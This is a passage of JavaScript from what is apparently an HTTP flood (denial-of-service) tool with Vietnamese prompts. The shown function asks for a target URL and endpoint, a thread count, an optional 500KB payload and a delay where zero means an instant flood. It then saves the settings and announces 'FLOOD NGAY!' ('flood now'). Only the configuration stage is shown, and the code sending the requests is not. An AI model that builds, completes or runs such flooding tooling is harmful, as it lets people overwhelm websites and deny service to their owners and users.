  const threads = await question('› Số luồng (10-100, mặc định 20): ');
  const sendPayload = await question('› Gửi payload 500KB? (y/n, mặc định n): ');
  const customDelay = await question('› Delay (ms, 0 = flood tức thì, mặc định 0): ');
  
  const config = {
    url: url.replace(/\/$/, ''),
    endpoint: endpoint || '/',
    threads: Math.min(100, parseInt(threads) || 20),
    sendPayload: sendPayload.toLowerCase() === 'y',
    delay: parseInt(customDelay) || 0,
    setupTime: new Date().toISOString()
  };
  
  saveConfig(config);
  log('\n✓ CẤU HÌNH ĐÃ LƯU! FLOOD NGAY!', 'green');
  await question('\nNhấn Enter để tiếp tục...');
  return config;
}

